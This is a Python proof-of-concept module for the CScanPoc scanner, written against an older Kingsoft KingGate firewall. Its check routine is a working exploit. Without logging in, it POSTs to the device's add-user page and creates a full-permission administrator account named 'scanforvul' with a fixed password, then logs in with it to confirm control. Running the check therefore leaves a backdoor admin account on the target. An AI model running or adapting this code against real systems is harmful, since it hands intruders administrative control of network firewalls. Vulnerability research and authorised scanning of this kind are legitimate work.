# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'KingSoft_0003'  # 平台漏洞编号，留空
    name = '金山KingGate防火墙 获取权限'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-08-19'  # 漏洞公布时间
    desc = '''
        金山旗下"KingGate"硬件防火墙产品（旧版）存在设计缺陷无需登录情况下可任意添加管理员。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '金山软件'  # 漏洞应用名称
    product_version = '金山KingGate防火墙'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6a3b6ebe-4dc4-4957-8c53-b745e866737a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #info:http://www.wooyun.org/bugs/wooyun-2010-0135128
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/src/system/addmanageuser.php'
            code, head, res, errcode, _ = hh.http(url)
            pos1 = head.find("PHPSESSID=")+10
            pos2 = head.find("\n",pos1)
            session_id = head[pos1:pos2]
            postdata = "IG_current_menu_name=%25CF%25B5%25CD%25B3%25C5%25E4%25D6%25C3&IG_current_submenu_name=%25B9%25DC%25C0%25ED%25C9%25E8%25D6%25C3&IG_user=scanforvul&IG_password=123qwe%21%40%23&IG_password1=123qwe%21%40%23&IG_permission1=1&IG_permission2=1&IG_permission3=1&IG_permission4=1"
            code, head, res, errcode, _ = hh.http(url,post=postdata)
            url = arg + '/src/system/login.php'
            postdata = "session_id=" + session_id + "&IG_user=scanforvul&IG_passwd=123qwe!@#&sutmit1=%C8%B7%C8%CF"
            code, head, res, errcode, _ = hh.http(url,post=postdata)
            if code == 302 and 'Location:' in head:
                #security_hole("金山KingGate旧版网关防火墙添加管理员:http://www.wooyun.org/bugs/wooyun-2010-0135128")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
